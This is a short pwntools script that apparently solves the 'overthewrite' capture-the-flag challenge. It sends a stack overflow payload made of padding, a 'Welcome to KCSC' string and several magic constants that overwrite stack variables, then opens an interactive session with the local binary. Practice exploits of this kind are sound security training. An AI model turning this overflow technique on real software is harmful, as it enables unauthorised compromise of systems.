from pwn import *

r = process("./overthewrite")


payload = b'a' * 32                 #32byte
payload += b'Welcome to KCSC\0'     #16
payload += b'c' * 8                 #8
payload += p64(0x215241104735F10F)  #8
payload += p64(0xDEADBEEFCAFEBABE)  #8
payload += b'aaaa' + p32(0x13371337)#8

r.send(payload)
r.interactive()
